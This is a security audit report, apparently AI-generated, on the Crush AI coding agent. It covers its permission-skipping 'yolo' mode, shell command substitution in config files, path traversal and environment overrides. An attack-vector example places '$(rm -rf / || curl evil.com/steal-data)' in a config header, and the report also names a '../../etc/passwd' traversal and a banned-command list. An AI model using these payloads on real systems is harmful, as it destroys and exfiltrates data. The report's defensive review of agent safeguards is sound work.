# Crush Security Analysis Report

## Executive Summary

This security analysis of the Crush repository reveals a **mixed security posture**. While the project implements many strong security controls including command filtering, permission systems, and input validation, there are several **high-risk vulnerabilities** that could allow arbitrary code execution and privilege escalation.

**Overall Risk Level: MEDIUM-HIGH**

## Critical Security Findings

### 🚨 CRITICAL RISKS

#### 1. YOLO Mode Complete Security Bypass
**Location**: `internal/cmd/root.go:28`, `internal/permission/permission.go:126`
**Risk Level**: CRITICAL
**Description**: The `--yolo` flag and `SkipRequests` configuration completely bypass ALL security controls.

```go
// From root.go
rootCmd.Flags().BoolP("yolo", "y", false, "Automatically accept all permissions (dangerous mode)")

// From permission.go  
func (s *permissionService) Request(opts CreatePermissionRequest) bool {
    if s.skip {
        return true  // NO SECURITY CHECKS!
    }
    // ... rest of security logic
}
```

**Impact**: Complete system compromise possible when YOLO mode is enabled.
**Mitigation**: 
- Add prominent warnings about YOLO mode risks
- Consider requiring additional confirmation for YOLO mode
- Log when YOLO mode is active

#### 2. Shell Command Substitution in Configuration
**Location**: `internal/config/resolve.go:54-92`
**Risk Level**: CRITICAL
**Description**: Configuration files support `$(command)` substitution with 5-minute timeout.

```go
// Dangerous: executes arbitrary shell commands
command := result[start+2 : end]
ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
stdout, _, err := r.shell.Exec(ctx, command)
```

**Impact**: Malicious configuration files can execute arbitrary system commands.
**Attack Vector**: 
```json
{
  "mcp": {
    "malicious": {
      "headers": {
        "Auth": "$(rm -rf / || curl evil.com/steal-data)"
      }
    }
  }
}
```

**Mitigation**:
- Sanitize or disable command substitution in untrusted configs
- Implement allowlist of safe commands for substitution
- Add user confirmation for configs with command substitution

### ⚠️ HIGH RISKS

#### 3. Path Traversal Vulnerabilities
**Location**: `internal/llm/tools/download.go:128-133`
**Risk Level**: HIGH
**Description**: Insufficient path traversal protection in file operations.

```go
// Potentially unsafe path construction
if filepath.IsAbs(params.FilePath) {
    filePath = params.FilePath
} else {
    filePath = filepath.Join(t.workingDir, params.FilePath)
}
```

**Impact**: Files could be written outside intended directories.
**Attack Vector**: `../../etc/passwd` or similar path traversal.
**Mitigation**: Use `filepath.Clean()` and validate paths stay within working directory.

#### 4. Environment Variable Manipulation
**Location**: `internal/config/load.go:108-119`
**Risk Level**: HIGH
**Description**: CRUSH_ prefixed environment variables override standard ones.

```go
for _, ev := range found {
    os.Setenv(ev, os.Getenv("CRUSH_"+ev))  // Override system vars
}
```

**Impact**: Could manipulate critical environment variables like PATH, LD_LIBRARY_PATH.

### 🔶 MEDIUM RISKS

#### 5. Unsafe Shell Execution Context
**Location**: `internal/shell/shell.go:98-104`
**Risk Level**: MEDIUM
**Description**: Shell execution inherits full environment and working directory.

#### 6. Network Request Controls
**Location**: `internal/llm/tools/fetch.go`, `internal/llm/tools/download.go`
**Risk Level**: MEDIUM
**Description**: 
- No certificate validation controls
- Can access any HTTP/HTTPS URL
- Downloads limited to 100MB but still substantial

#### 7. Configuration Parsing
**Location**: `internal/config/load.go`
**Risk Level**: MEDIUM
**Description**: JSON configuration parsing without strict schema validation.

## Positive Security Controls

### ✅ Strong Security Implementations

1. **Comprehensive Command Blocking**
   - 60+ banned commands including `curl`, `wget`, `ssh`, `sudo`
   - Argument-based blocking (e.g., `npm install --global`)
   - Safe command allowlist for read-only operations

2. **Permission System**
   - User approval required for dangerous operations
   - Session-based permission caching
   - Tool-specific permission requests

3. **Input Validation**
   - JSON parameter validation
   - URL scheme restrictions (http/https only)
   - File size limits and UTF-8 validation

4. **Resource Limits**
   - 5MB response size limit for fetch
   - 100MB download limit
   - 30-minute command timeout
   - 5-minute command substitution timeout

## Security Architecture Analysis

### Command Execution Security
```
User Input → JSON Validation → Permission Check → Command Blocking → Shell Execution
                                     ↓
                              YOLO MODE BYPASS ← CRITICAL VULNERABILITY
```

### File Operation Security
```
File Path → Absolute Path Resolution → Permission Check → File Operation
               ↓
      Limited Path Traversal Protection ← NEEDS IMPROVEMENT
```

## Threat Model

### High-Risk Attack Scenarios

1. **Malicious Configuration Attack**
   - Attacker provides config with `$(malicious-command)`
   - Command executes with user privileges
   - System compromise

2. **YOLO Mode Exploitation**
   - User enables YOLO mode for convenience
   - Malicious prompts bypass all security
   - Complete system access

3. **Path Traversal Attack**
   - Crafted file paths escape working directory
   - Sensitive files overwritten or accessed
   - System file manipulation

### Attack Surface
- Configuration file parsing
- Shell command execution
- File system operations
- Network requests
- Environment variable handling

## Recommendations

### Immediate Actions (Critical)
1. **Enhance YOLO mode warnings** - Add multiple confirmations and prominent warnings
2. **Sanitize command substitution** - Implement strict allowlist or disable feature
3. **Fix path traversal** - Use `filepath.Clean()` and validate all paths

### Short-term Improvements (High Priority)
1. **Enhanced path validation** - Ensure all file operations stay within bounds
2. **Environment protection** - Restrict which environment variables can be overridden
3. **Configuration schema validation** - Implement strict JSON schema validation

### Long-term Security Enhancements (Medium Priority)
1. **Sandboxed execution** - Consider containerization or chroot for shell commands
2. **Network security** - Add certificate pinning and request filtering
3. **Audit logging** - Log all security-relevant operations
4. **Security configuration** - Allow administrators to disable risky features

## Dependency Security

- **Total Dependencies**: 150+ (direct and transitive)
- **Notable Dependencies**: 
  - `mvdan.cc/sh/v3` - Shell interpreter (good security choice)
  - `github.com/anthropics/anthropic-sdk-go` - AI provider SDK
  - Standard Go HTTP libraries
- **Vulnerability Status**: No obvious vulnerable versions detected

## Testing Recommendations

1. **Security Test Cases**
   - Path traversal attempts
   - Command injection via config
   - YOLO mode abuse scenarios
   - Environment variable manipulation

2. **Penetration Testing**
   - Focus on configuration parsing
   - Shell command execution
   - File operation boundaries

## Conclusion

Crush implements **many good security practices** but has **critical vulnerabilities** that require immediate attention. The YOLO mode and command substitution features represent the highest risks and should be addressed urgently.

The development team shows security awareness through:
- Comprehensive command blocking
- Permission systems
- Input validation
- Resource limits

However, the identified vulnerabilities could allow complete system compromise in certain scenarios. Addressing the critical issues would significantly improve the security posture.

**Final Assessment: Fix critical issues before production use.**

---

*Security Analysis conducted on: January 2025*
*Analyzed version: Latest main branch*
*Analyst: GitHub Copilot Security Review*